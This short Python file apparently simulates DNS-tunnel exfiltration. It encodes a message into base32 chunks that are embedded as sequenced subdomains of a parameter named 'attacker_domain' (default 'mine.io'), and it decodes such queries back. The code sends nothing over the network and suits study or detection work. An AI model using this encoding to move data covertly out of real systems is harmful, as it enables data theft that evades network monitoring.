import base64
from typing import Sequence

def encode_message_as_queries(
    message: str,
    attacker_domain: str = "mine.io",
    chunk_size: int = 2,
) -> list[str]:
    
    encoded = base64.b32encode(message.encode("utf-8")).decode("ascii")
    encoded = encoded.rstrip("=")

    chunks = [
        encoded[index : index + chunk_size]
        for index in range(0, len(encoded), chunk_size)
    ]
    return [
        f"{sequence:03d}.{chunk}.{attacker_domain}"
        for sequence, chunk in enumerate(chunks)
    ]

def decode_queries(
        queries: Sequence[str]
) -> str:

    pieces = []
    for query in queries:
        labels = query.rstrip(".").split(".")
        if len(labels) < 4 or not labels[0].isdigit():
            raise ValueError(f"Unexpected simulated tunnel query: {query}")
        pieces.append((int(labels[0]), labels[1]))

    encoded = "".join(piece for _, piece in sorted(pieces))
    padding = "=" * ((8 - len(encoded) % 8) % 8)
    decoded = base64.b32decode(encoded + padding)
    return decoded.decode("utf-8")